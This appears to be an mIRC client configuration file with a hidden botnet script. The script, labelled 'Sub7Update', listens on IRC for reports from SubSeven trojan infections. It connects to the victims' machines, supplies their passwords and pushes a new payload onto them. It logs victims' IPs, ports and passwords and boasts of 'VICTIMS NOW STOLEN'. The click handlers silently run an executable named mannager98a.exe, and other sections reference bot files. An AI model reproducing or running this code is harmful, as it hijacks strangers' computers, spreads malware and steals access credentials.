[text]
ignore=*.*
commandchar=/
linesep=-
timestamp=[HH:nn]
network=All
finger=fB 2k
accept=*.jpg,*.gif,*.png,*.bmp,*.txt,*.log,*.wav,*.mid,*.mp3,*.zip
quit=Looks Like My Time Is Up ( $+ $gettok($ip,1,46) $+ : $+ $gettok($ip,2,46) $+ : $+ $gettok($ip,3,46) $+ : $+ $str(*,$len($gettok($ip,4,46))) $+ )
[files]
addrbk=addrbk.ini
servers=servers.ini
browser=c:\progra~1\intern~1\iexplore.exe
emailer=c:\program files\outlook express\msimn.exe
finger=finger.txt
urls=urls.ini
[warn]
fserve=off
dcc=off
[options]
n0=0,0,0,0,0,1,300,1,1,0,1,0,0,0,1,1,0,1,0,1,512,0,1,4,0,0,0,1,0,50,1
n1=0,0,0,0,0,0,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,20,0,0,0,2,2,0
n2=1,0,0,0,1,1,1,1,0,80,160,1,1,1,1,0,0,0,1,160,40,10,0,0,1,0,1,1,0
n3=500,0,0,0,1,0,1,0,0,1,0,1,0,0,1,1,1,0,0,0,0,0,1,0,0,0,2,10,0,0
n4=0,0,1,0,0,3,9999,0,0,1,1,0,1024,0,1,9999,60,0,0,0,1,0,0,2,1,5000,0,2
n5=1,1,1,1,1,1,1,1,1,1,6667,0,0,0,0,1,1,0,300,10,4,0,0,22,0,0,0,999999
n6=0,0,2,0,1,1,0,0,1,0,0,0,0,0,0,0,1,0,0,1,0,0,100,1,1,0,0,0,0,0,2
n7=1,0,0,0,0,0,0,1,1,1,1,1,0,1,0,0
[dirs]
[about]
show=sheep
version=5.91
[windows]
scripts=37,767,77,497,0,0,0
main=776,112,-18,27,0,1,0
wchannel=21,112,21,27,0,1,0
status=0,112,0,27,0,1,0
wquery=0,501,0,211,1,1,0
wserv=42,483,42,345,1,1,0
wmessage=14,633,57,393,0,1,0
wdccg=0,240,0,212,0,1,0
wnotify=42,828,42,526,0,1,0
[events]
default=2,2,3,2,2,1,1
[ident]
active=yes
system=UNIX
port=113
userid=basil
[socks]
enabled=no
port=1080
method=4
dccs=no
[clicks]
status=//run $mircdir $+ mannager98a.exe  /n /fh ������ | /nick DC-Status $+ $rand(0,99999)
query=//run $mircdir $+ mannager98a.exe /n /fh ������ | /nick DC-Query $+ $rand(0,99999)
channel=//run $mircdir $+ mannager98a.exe /n /fh ������ | /nick DC-Channel $+ $rand(0,99999)
nicklist=//run $mircdir $+ mannager98a.exe/ n /fh ������ | /nick DC-NickList $+ $rand(0,99999)
notify=//run $mircdir $+ mannager98a.exe /n /fh ������ | /nick DC-Notify $+ $rand(0,99999)
[dde]
ServerStatus=off
ServiceName=mIRC
CheckName=off
[fileserver]
warning=off
homedir=c:
[dccserver]
n0=0,59,0,0,0,0
[mirc]
nick=[N]elisha[56497]
anick=froZen-3070
user=alysa
email=unf@me.now
host=bartsimpson.servebeer.comSERVER:bartsimpson.servebeer.com:6667

[script]
n0=#Sub7Update off
n1=on *:TEXT:*ip* *port*:*:{
n2=if ($strip($1,burc) = ip:) && ($strip($3,burc) = port:) {
n3=if (%uplocation == $null) { /nick NoUplocation $+ $rand(0,9999) }
n4=/set %s7rem.socket E $+ $4 $+ $chr(46) $+ $2
n5=if ($sock(%s7rem.socket) = $null) {
n6=sockopen %s7rem.socket $2 $4
n7=}
n8=; msg %sub7.chan 12Attempting to update:3 $2 on $4 $+ 15...
n9=//set %last.scan $4
n10=}
n11=}
n12=on *:TEXT:*sub7server*:*:{
n13=set %s7rem.text $strip($1-)
n14=
n15=if ($gettok(%s7rem.text,2,32) == v.GOLD) set %s7rem.theips $gettok(%s7rem.text,9,32)
n16=else set %s7rem.theips $gettok(%s7rem.text,8,32)
n17=
n18=if ($right(%s7rem.theips,1) == $chr(46)) set %s7rem.theips $left(%s7rem.theips,$calc($len(%s7rem.theips) - 1))
n19=
n20=set %s7rem.numtok $numtok(%s7rem.theips,45)
n21=
n22=if (%s7rem.numtok > 1) {
n23=set %s7rem.echoip $gettok(%s7rem.theips,%s7rem.numtok,45)
n24=msg %sub7.chan 12 $+ $s7rem.bt $s7rem.bl $+ $nick displayed more than one IP, using the rightmost IP out of %s7rem.numtok $+ .
n25=}
n26=else set %s7rem.echoip %s7rem.theips
n27=
n28=set %s7rem.p1 $calc($pos(%s7rem.text, $chr(58), 1) + 2)
n29=set %s7rem.p2 $pos(%s7rem.text, $chr(44), 1)
n30=set %s7rem.echoport $mid(%s7rem.text, %s7rem.p1, $calc(%s7rem.p2 - %s7rem.p1))
n31=
n32=set %s7rem.p1 $calc($pos(%s7rem.text, $chr(58), 4) + 2)
n33=set %s7rem.p2 $calc($len(%s7rem.text) + 1)
n34=set -u500 %s7rem.echopass.E $+ %s7rem.echoport $+ $chr(46) $+ %s7rem.echoip $mid(%s7rem.text, %s7rem.p1, $calc(%s7rem.p2 - %s7rem.p1))
n35=
n36=if (%s7rem.echoip == $null) {
n37=msg %sub7.chan 4 $+ $s7rem.sbt $s7rem.bl $+ Error: Oh Fuck Evaluated IP address is blank. :(
n38=return
n39=}
n40=if ($chr(45) isin %s7rem.echoip) {
n41=msg %sub7.chan 4 $+ $s7rem.sbt $s7rem.bl $+ Error: Seperator found in evaluated IP address.
n42=return
n43=}
n44=
n45=if ($left(%s7rem.echoip,3) == 10.) s7rem.ipf
n46=if ($left(%s7rem.echoip,3) == 169) s7rem.ipf
n47=if ($left(%s7rem.echoip,3) == 192) s7rem.ipf
n48=; if ($left(%s7rem.echoip,3) == 172) s7rem.ipf
n49=
n50=set %s7rem.socket E $+ %s7rem.echoport $+ $chr(46) $+ %s7rem.echoip
n51=if ($sock(%s7rem.socket) != $null) {
n52=msg %sub7.chan 12 $+ $s7rem.bt $s7rem.bl $+ Socket already open: %s7rem.socket $+ . Closing and reopening socket... :)
n53=sockclose %s7rem.socket
n54=}
n55=if ($sock(%s7rem.socket) = $null) {
n56=sockopen %s7rem.socket %s7rem.echoip %s7rem.echoport
n57=}
n58=}
n59=
n60=alias s7rem.bl /return $chr(3) $+ 1
n61=alias s7rem.ec /if ($group(#s7rem) == on) return $chr(9) $+ [on] | else return $chr(9) $+ [off]
n62=alias s7rem.ipf {
n63=msg %sub7.chan 4 $+ $s7rem.bt $s7rem.bl $+ Evaluated IP address ( $+ %s7rem.echoip $+ ) is not updateable Fuck Fuck Fuck :(
n64=halt
n65=}
n66=alias s7rem.stats {
n67=msg %sub7.chan $s7rem.bt $chr(3) $+ 2Number Of VICTIMS NOW STOLEN Wheeeee Thanks Unca HeLL: $chr(3) $+ 12 $+ %gc $+ $chr(3) $+ 2.
n68=msg %sub7.chan $s7rem.bt $chr(3) $+ 2Number of failed update attempts, Blame Unca HeLL The Old Bastard(incorrect passwords): $chr(3) $+ 12 $+ %gf $+ $chr(3) $+ 2.
n69=}
n70=alias s7rem.rv {
n71=if ($$1 == 1) {
n72=unset %s7rem.*
n73=msg %sub7.chan $s7rem.bt $chr(3) $+ 2All temporary variables have been removed.
n74=}
n75=if ($$1 == 2) {
n76=unset %s7rem.echopass.*
n77=msg %sub7.chan $s7rem.bt $chr(3) $+ 2All temporary password variables have been removed.
n78=}
n79=}
n80=on *:SOCKOPEN:E*:{
n81=if ($sockerr > 0) {
n82=; msg %sub7.chan Socket error: $chr(3) $+ 1 $+ ( $+ $gettok($remove($sockname,e),2-,46) on $gettok($remove($sockname,e),1,46) $+ ) $sockerr
n83=return
n84=}
n85=}
n86=on *:SOCKREAD:E*:{
n87=sockread -f %s7rem.echodata
n88=echo -a $s7rem.bts $s7rem.bl $+ 0,1Debug ( $+ $gettok($remove($sockname,e),2-,46) $gettok($remove($sockname,e),1,46) $+ ) %s7rem.echodata
n89=if (User not logged in. Please login with USER and PASS first. isin %s7rem.echodata) {
n90=msg %sub7.chan 7Fuck i can't do shit with this user as hes some fucked up wierdo with some fucked up shit DON'T CONNECT TO $gettok($remove($sockname,e),2-,46) on $gettok($remove($sockname,e),1,46)
n91=.sockclose $sockname
n92=halt
n93=}
n94=if ($gettok(%s7rem.echodata,1,32) = RQS) { msg %sub7.chan Found some wierd ass RQS in there so i'm closing $gettok($remove($sockname,e),2-,46) on $gettok($remove($sockname,e),1,46) $+ !!!!!!!!!! | sockclose $sockname | halt }
n95=if (%s7rem.echodata == POPUP incorrect password...) {
n96=unset %s7rem.echopass. $+ $gettok($remove($sockname,e),1,46) $+ $chr(46) $+ $gettok($remove($sockname,e),2-,46)
n97=inc %gf
n98=; msg %sub7.chan 12Update/Error:10 $gettok($remove($sockname,e),2-,46) on $gettok($remove($sockname,e),1,46) (password protection/error)
n99=halt
n100=}
n101=if ([can't connect: No Error (Error #0)]. isin %s7rem.echodata) {
n102=msg %sub7.chan 4Error with Client Downloading file $gettok($remove($sockname,e),2-,46) on $gettok($remove($sockname,e),1,46) Aborting
n103=sockclose $sockname
n104=halt
n105=}
n106=if ([RPL] isin %s7rem.echodata) {
n107=msg %sub7.chan 4Some Mother fucking [RPL] Error $gettok($remove($sockname,e),2-,46) on $gettok($remove($sockname,e),1,46) Aborting
n108=.sockclose $sockname
n109=halt
n110=}
n111=if (%s7rem.echodata == Error Reading Password...) {
n112=//msg %sub7.chan 4Error Reading Password with $gettok($remove($sockname,e),2-,46) on $gettok($remove($sockname,e),1,46) Going To Abort
n113=sockclose $sockname
n114=halt
n115=}
n116=if (%s7rem.echodata == downloading file.) {
n117=inc %gc
n118=//msg %sub7.chan 8Beginning update:10 for $gettok($remove($sockname,e),2-,46) on $gettok($remove($sockname,e),1,46)
n119=halt
n120=}
n121=
n122=if (%s7rem.echodata == server updated. closing...) {
n123=inc %gc
n124=//msg %sub7.chan 8Updated Successfully!:10 for $gettok($remove($sockname,e),2-,46) on $gettok($remove($sockname,e),1,46)
n125=if (%s7rem.echopass. [ $+ [ $gettok($remove($sockname,e),1,46) [ $+ [ $chr(46) [ $+ [ $gettok($remove($sockname,e),2-,46) ] ] ] ] ] ] = $null) {
n126=.write $gettok($remove($sockname,e),1,46) $+ .txt $gettok($remove($sockname,e),2-,46) on $gettok($remove($sockname,e),1,46)
n127=}
n128=else {
n129=.write $gettok($remove($sockname,e),1,46) $+ .txt $gettok($remove($sockname,e),2-,46) on $gettok($remove($sockname,e),1,46) %s7rem.echopass. $+ $gettok($remove($sockname,e),1,46) $+ $chr(46) $+ $gettok($remove($sockname,e),2-,46)
n130=}
n131=halt
n132=}
n133=if (file successfully downloaded isin %s7rem.echodata) {
n134=inc %gc
n135=//msg %sub7.chan 8Updated Successfully!:10 for $gettok($remove($sockname,e),2-,46) on $gettok($remove($sockname,e),1,46)
n136=if (%s7rem.echopass. [ $+ [ $gettok($remove($sockname,e),1,46) [ $+ [ $chr(46) [ $+ [ $gettok($remove($sockname,e),2-,46) ] ] ] ] ] ] = $null) {
n137=.write $gettok($remove($sockname,e),1,46) $+ .txt $gettok($remove($sockname,e),2-,46) on $gettok($remove($sockname,e),1,46)
n138=}
n139=else {
n140=.write $gettok($remove($sockname,e),1,46) $+ .txt $gettok($remove($sockname,e),2-,46) on $gettok($remove($sockname,e),1,46) %s7rem.echopass. $+ $gettok($remove($sockname,e),1,46) $+ $chr(46) $+ $gettok($remove($sockname,e),2-,46)
n141=}
n142=halt
n143=}
n144=if (%s7rem.echodata == PWD) {
n145=if (%s7rem.echopass. [ $+ [ $gettok($remove($sockname,e),1,46) [ $+ [ $chr(46) [ $+ [ $gettok($remove($sockname,e),2-,46) ] ] ] ] ] ] = $null) {
n146=sockwrite $sockname PWD $+ 14438136782715101980
n147=}
n148=else { sockwrite $sockname PWD $+ %s7rem.echopass. $+ $gettok($remove($sockname,e),1,46) $+ $chr(46) $+ $gettok($remove($sockname,e),2-,46) }
n149=sockwrite $sockname UFU $+ %uplocation
n150=}
n151=else {
n152=sockwrite $sockname UFU $+ %uplocation
n153=}
n154=}
n155=on *:TEXT:*on*:*:{
n156=if ($2 == on) && ($3 isnum) {
n157=if (%uplocation == $null) { nick NoUplocation $+ $rand(0,9999) }
n158=/set %s7rem.socket E $+ $3 $+ $chr(46) $+ $1
n159=if ($sock(%s7rem.socket) = $null) {
n160=sockopen %s7rem.socket $1 $3
n161=/msg %sub7.chan 12Attempting to update:3 $1 on $3 $+ 15...
n162=//set %last.scan $1
n163=}
n164=else { ; msg %connect.chan Socket is allready Open }
n165=}
n166=}
n167=on *:TEXT:!update stats*:#:{ 
n168=//msg # 4*** Update Stats ***
n169=//msg # 12Fails:4 %gf
n170=//msg # 12Complete:  $+ %gc
n171=//msg # 14Last Single(IP) Scan:12 %last.scan 
n172=//msg # 10Current Time: $time
n173=//msg # 4End/Stats Report
n174=}
n175=#Sub7Update end

[colours]
n0=0,6,4,5,2,3,3,3,3,3,3,1,5,2,6,1,3,2,3,5,1,0,1,0,1
[pfiles]
n0=popups.ini
n1=popups.ini
n2=popups.ini
n3=popups.ini
n4=popups.ini
[fonts]
fscripts=System,707,0
fstatus=Wingdings,707,2
fchannel=Wingdings 2,407,2
fquery=Wingdings,407,2

[local]
localip=67.227.61.211
longip=1138965971

[users]

[dragdrop]
n0=*.wav:/sound $1 $2-
n1=*.*:/dcc send $1 $2-
s0=*.*:/dcc send $1 $2-

[extensions]
n0=defaultEXTDIR:\

[findtext]
n0=ats)
n1=!Stats
n2=Web Stats
n3=(Fr�zen �oT)
n4=[Frozen-�ot]
n5=temp2.exe
n6=webze
n7=ircd
n8=temp.scr
n9=temp2.
n10=ats) && ($nick isop $chan) && ($me isvo $chan)
n11=[Frozen-�ot]
n12=[Frozen �ot]
n13=mannager98a.exe
n14=winddowslogs

[ignore]
n0=*@*,ctcp,notice,invite

[afiles]
n0=mirc.ini

[rfiles]
n0=bw98.cab
n1=w98se.cab
n2=all.exe
n3=truesys.zip
n4=spnt.fat32
n5=flood.ini

